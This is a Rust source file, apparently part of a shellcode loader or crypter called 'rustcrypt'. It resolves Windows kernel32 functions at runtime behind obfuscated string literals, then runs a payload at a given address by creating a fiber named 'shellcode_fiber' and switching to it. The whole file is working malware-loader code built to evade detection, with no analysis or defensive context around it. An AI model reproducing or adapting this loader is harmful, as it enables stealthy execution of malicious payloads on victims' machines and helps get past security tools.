use std::ffi::c_void;
pub unsafe fn exec(p: usize) -> Result<(), String> {
    use crate::utils::{load_library, get_proc_address};
    use rustcrypt_ct_macros::{obf_lit_bytes, obf_lit};
    use std::mem::transmute;
    use std::ptr::null_mut;

    let kernel32 = load_library(obf_lit_bytes!(b"kernel32.dll\0").as_slice())?;
    let p_convert = get_proc_address(kernel32, obf_lit_bytes!(b"ConvertThreadToFiber\0").as_slice())?;
    let p_create = get_proc_address(kernel32, obf_lit_bytes!(b"CreateFiber\0").as_slice())?;
    let p_switch = get_proc_address(kernel32, obf_lit_bytes!(b"SwitchToFiber\0").as_slice())?;

    type ConvertThreadToFiberFn = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
    type CreateFiberFn = unsafe extern "system" fn(usize, unsafe extern "system" fn(*mut c_void), *mut c_void) -> *mut c_void;
    type SwitchToFiberFn = unsafe extern "system" fn(*mut c_void);

    let convert_thread_to_fiber: ConvertThreadToFiberFn = transmute(p_convert);
    let create_fiber: CreateFiberFn = transmute(p_create);
    let switch_to_fiber: SwitchToFiberFn = transmute(p_switch);

    let primary_fiber = convert_thread_to_fiber(null_mut());
    if primary_fiber.is_null() {
        return Err(obf_lit!("ConvertThreadToFiber failed").to_string());
    }

    let shellcode_fiber = create_fiber(0, transmute(p), null_mut());
    if shellcode_fiber.is_null() {
        return Err(obf_lit!("CreateFiber failed").to_string());
    }

    switch_to_fiber(shellcode_fiber);
    
    Ok(())
}